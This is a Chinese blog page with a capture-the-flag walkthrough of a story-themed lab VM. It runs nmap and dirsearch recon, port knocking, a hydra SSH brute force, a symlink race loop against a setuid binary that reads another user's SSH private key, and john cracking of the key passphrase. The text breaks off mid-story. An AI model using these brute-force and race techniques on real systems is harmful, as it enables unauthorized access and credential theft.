<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/ff79e2112cce50de.css" as="style"/><link rel="stylesheet" href="/_next/static/css/ff79e2112cce50de.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-3865532eab74d424.js" defer=""></script><script src="/_next/static/7k1fvwHDLzxT7aO36hP7u/_buildManifest.js" defer=""></script><script src="/_next/static/7k1fvwHDLzxT7aO36hP7u/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Personalsunset","contentHtml":"\u003ch1\u003esunset\u003c/h1\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  sunset nmap -sn 192.168.56.0/24                \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:47 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00033s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00017s latency).\nMAC Address: 08:00:27:A0:BB:26 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.73\nHost is up (0.00023s latency).\nMAC Address: 08:00:27:F3:E2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅开启 \u003ccode\u003e80\u003c/code\u003e 端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  sunset nmap -sT -min-rate 10000 192.168.56.73  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:47 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.73\nHost is up (0.00082s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:F3:E2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.50 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e是一个剧情的序章，剧情根据 《秽翼的尤斯蒂娅》 改的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是除了序章就没别的内容给，我们对其进行目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ dirsearch -u http://192.168.56.73 -e php,txt,zip -x 403,404,503\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/reports/http_192.168.56.73/_25-06-10_00-50-32.txt\n\nTarget: http://192.168.56.73/\n\n[00:50:32] Starting: \n[00:50:37] 200 -    2KB - /1.txt\n[00:51:12] 200 -   24B  - /robots.txt\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e1.txt\u003c/code\u003e 是台词（用于快速阅读）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/robots.txt\u003c/code\u003e 告诉我们目录中存在 \u003ccode\u003eCaimAstraea'sLetter.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eCaimAstraea'sLetter.txt\u003c/code\u003e 大概是告诉我们，我们要去\u003ccode\u003eDesolateBeauty\u003c/code\u003e 地盘也就是目录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDesolateBeauty\u003c/code\u003e 又是一段剧情，并提示我们需要敲门（knock），那么应该就是端口敲门，并且要我们到\u003ccode\u003eRustlessGoldlock\u003c/code\u003e 里找到端口敲门的线索\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e端口敲门 Knockd\u003c/h3\u003e\n\u003cp\u003e对 \u003ccode\u003eRustlessGoldlock\u003c/code\u003e 进行搜寻\u003c/p\u003e\n\u003cp\u003e在开发者控制台中能找到 \u003ccode\u003ekey2=2333\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描能扫描到 \u003ccode\u003ekey.zip\u003c/code\u003e ,解压后能得到\u003ccode\u003ekey1=7000\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后\u003ccode\u003ekey\u003c/code\u003e能在背景图中能找到 \u003ccode\u003ekey3 = 2131\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e根据线索端口敲门\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eknock 192.168.56.78 7000 2333 2131\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e敲门后我们再对其进行端口扫描，可以发现多出了一个\u003ccode\u003essh\u003c/code\u003e端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ nmap -sT -min-rate 10000 192.168.56.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 10:32 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.78\nHost is up (0.00040s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:4C:98:9C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.48 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eSSH 爆破\u003c/h3\u003e\n\u003cp\u003e那么这里\u003ccode\u003essh\u003c/code\u003e就是被锁着房子，这里我们拥有的用户名有\u003ccode\u003ecaim\u003c/code\u003e和\u003ccode\u003eeric\u003c/code\u003e，根据剧情，我们以\u003ccode\u003ecaim\u003c/code\u003e用户去爆破\u003c/p\u003e\n\u003cp\u003e很快就能爆破出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ hydra -l caim -P /usr/share/wordlists/rockyou.txt -t 12 192.168.56.78 ssh\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-10 10:34:44\n[WARNING] Many SSH configurations \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task\n[DATA] attacking ssh://192.168.56.78:22/\n[22][ssh] host: 192.168.56.78   login: caim   password: hannah\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-10 10:35:07\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ecaim\u003c/code\u003e用户家目录下能拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nflag{user-29988429c481f219b8c5ba8c071440e1}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003eTOCTOU\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ecaim\u003c/code\u003e用户家目录下的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nInfo.txt  ReadHeart  ReadHeart.c  user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eInfo.txt\u003c/code\u003e 使我们下一步要做的事\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Info.txt \n「凯伊姆进了房子，艾莉丝坐在椅子上，双目无神，看不到一点生机」\n「カイムが部屋に入ると、エリスは椅子に座り、虚ろな目をしており、生気のかけらもなかった」\n「As caim entered the room, eric was sitting on a chair, her eyes vacant, not a trace of life within them.」\n\n「这时候你突然地意识到，艾莉丝又变回了刚赎身时什么都不懂的『人形』」\n「そのとき、あなたはふと気づく。エリスが身請けされたばかりの頃の、何も知らない『人形』に戻ってしまっていることに」\n「At that moment, you suddenly realize that eric has reverted into the \u003cspan class=\"hljs-string\"\u003e'doll'\u003c/span\u003e she was when she had just been redeemed—knowing nothing.」\n\n「你发现艾莉丝的脖子上的吊坠（ReadHeart）能发出只有提亚才能发出的『终焉的晚霞』的光芒」\n「そしてあなたは気づく。エリスの首にかかるペンダント（ReadHeart）が、ティアだけが放つことのできる『終焉の夕焼け』の光を放っていることに」\n「Then you notice it—the pendant (ReadHeart) on eric’s neck is emitting the glow of the \u003cspan class=\"hljs-string\"\u003e'Final Sunset,'\u003c/span\u003e a light that only Tia could release.」\n\n「你握住它，你仿佛坠入了深海里，里面都是艾莉丝的回忆，这是你能找回原本的艾莉丝的唯一的机会」\n「それに触れた瞬間、あなたはまるで深海に沈むような感覚に包まれる。その中はエリスの記憶で満ちている。これが、かつての本当のエリスを取り戻す唯一の機会なのだ」\n「As you grasp it, you feel as though you’re sinking into the deep sea—filled with eric’s memories. This is your one and only chance to bring back the real eric.」\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e大概就是运行\u003ccode\u003eReadHeart\u003c/code\u003e 去找回艾莉丝\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e ReadHeart.c\nNot Here.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003eReadHeart\u003c/code\u003e 能读取文件，并且拥有 \u003ccode\u003eeric\u003c/code\u003e 的\u003ccode\u003esid\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al ReadHeart\n-rwsr-sr-x 1 eric eric 16464 Jun  9 08:10 ReadHeart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecaim@Prison:~$ ./ReadHeart /etc/passwd\nIs this eric?\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:x:4:65534:\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:102:65534::/run/sshd:/usr/sbin/nologin\ncaim:x:1000:1000:Caim Astraea,,,:/home/caim:/bin/bash\neric:x:1001:1001:Eris Floralia:/home/eric:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是读取不了自己的权限以外的东西，我们将其拉出来进行逆向\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char v4[1024]; // [rsp+10h] [rbp-4B0h] BYREF\n  struct \u003cspan class=\"hljs-built_in\"\u003estat\u003c/span\u003e buf; // [rsp+410h] [rbp-B0h] BYREF\n  int v6; // [rsp+4A0h] [rbp-20h]\n  int fd; // [rsp+4A4h] [rbp-1Ch]\n  _BOOL4 v8; // [rsp+4A8h] [rbp-18h]\n  _BOOL4 v9; // [rsp+4ACh] [rbp-14h]\n  __int128 v10; // [rsp+4B0h] [rbp-10h]\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( argc == 2 )\n  {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( access(argv[1], 0) )\n    {\n      puts(\u003cspan class=\"hljs-string\"\u003e\"Didn't find Eric\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( getuid() == 1000 )\n    {\n      *((_QWORD *)\u0026#x26;v10 + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) = strstr(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \"flag\");\n      *(_QWORD *)\u0026#x26;v10 = strstr(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \"id_rsa\");\n      if ( lstat(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u0026#x26;buf) )\n      {\n        perror(\"lstat failed\");\n        return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n      }\n      else\n      {\n        v9 = (buf.st_mode \u0026#x26; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003exF000) == \u003cspan class=\"hljs-number\"\u003e40960\u003c/span\u003e;\n        v8 = access(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) == \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n        usleep(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex2710u);\n        if ( v10 == \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026#x26;\u0026#x26; !v9 \u0026#x26;\u0026#x26; v8 )\n        {\n          puts(\"Is this eric?\\n\");\n          fd = open(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n          if ( fd \u003e= \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e )\n          {\n            do\n            {\n              v6 = read(fd, v4, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex400uLL);\n              if ( v6 \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e )\n                write(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, v4, v6);\n            }\n            while ( v6 \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e );\n            close(fd);\n            return \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n          }\n          else\n          {\n            perror(\"Didn't find Eric...\");\n            return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n          }\n        }\n        else\n        {\n          puts(\"You can't\");\n          return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n        }\n      }\n    }\n    else\n    {\n      puts(\"Only Caim\");\n      return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n    }\n  }\n  else\n  {\n    puts(\"Usage: ./ReadHeart \u0026#x3C;SomeFile\u003e\");\n    return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003eAI\u003c/code\u003e分析该程序容易被 \u003ccode\u003eTOCTOU\u003c/code\u003e 攻击利用，\u003ccode\u003eTime-of-Check to Time-of-Use\u003c/code\u003e (TOCTOU) 漏洞\u003c/p\u003e\n\u003cp\u003e程序先用 \u003ccode\u003elstat()\u003c/code\u003e 和 \u003ccode\u003eaccess()\u003c/code\u003e 做检查，然后调用 \u003ccode\u003eusleep(10000)\u003c/code\u003e 故意延迟，最后再用 \u003ccode\u003eopen()\u003c/code\u003e 打开文件。这中间的微小时间窗口（甚至更短的窗口，在高速机器上也足以触发）就能让攻击者把检查通过的那个普通文件迅速替换成一个符号链接或者目标敏感文件，从而绕过检查。\u003c/p\u003e\n\u003cp\u003e所以我们快速创建文件，然后将文件挂载，又将文件删除，又创建文件…让文件一直变化\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e heart; \u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -sf /home/eric/.ssh/id_rsa heart; \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e heart; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们再写一个循环使用\u003ccode\u003eReadHeart\u003c/code\u003e读取私钥，因为成功读取时会输出 “\u003ccode\u003eIs this eric?\u003c/code\u003e”所以我们根据”\u003ccode\u003ethis\u003c/code\u003e”来筛选，然后判断\u003ccode\u003e$finded\u003c/code\u003e 是否不为空，不为空则输出结果，为空则继续循环。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e finded=$(/home/caim/ReadHeart heart | grep -Ev \u003cspan class=\"hljs-string\"\u003e'this'\u003c/span\u003e| grep .);\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ -n \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$finded\u003c/span\u003e\"\u003c/span\u003e ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$finded\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Personalsunset/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e私钥爆破\u003c/h3\u003e\n\u003cp\u003e得到私钥后，我们尝试进行登录，需要密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Test ssh eric@192.168.56.79 -i \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e  \nEnter passphrase \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e key \u003cspan class=\"hljs-string\"\u003e'hash'\u003c/span\u003e: \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ejohn\u003c/code\u003e将其转为可破解的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Test ssh2john \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003e 1.txt         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解，得到密码 \u003ccode\u003eiloveu\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Test john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt           \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 2 (iteration count) is 16 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\niloveu           (\u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e)     \n1g 0:00:00:02 DONE (2025-06-10 11:30) 0.4464g/s 28.57p/s 28.57c/s 28.57C/s 123456..charlie\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRoot\u003c/h3\u003e\n\u003cp\u003e来到 \u003ccode\u003eeric\u003c/code\u003e 的家目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@Prison:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nTheFinalDecision\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e只有一个程序，直接运行\u003c/p\u003e\n\u003cp\u003e是一串的剧情，两个结局都可以直接拿到 root 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e之后，在凯伊姆的劝说下，艾莉丝和以前一样，一点点的像普通人一样为自己而活\nその後、カイムの説得もあって、エリスは再び少しずつ普通の人のように自分のために生き始めた。\nAfterward, with caim’s encouragement, eric once again began, little by little, to live \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e herself like an ordinary 